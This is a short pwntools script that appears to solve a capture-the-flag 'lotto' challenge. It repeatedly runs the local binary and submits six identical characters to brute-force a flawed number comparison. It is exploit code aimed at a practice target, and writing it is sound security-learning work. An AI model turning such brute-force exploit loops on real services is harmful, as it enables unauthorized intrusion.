import pwn

pwn.context.log_level = "debug"

while True:

    p = pwn.process('./lotto')
    p.recvuntil('3. Exit')
    p.sendline('1'.encode())
    print(p.recvuntil('Submit your'))
    p.send(('#'*6).encode())
    p.recvuntil('bad luck')

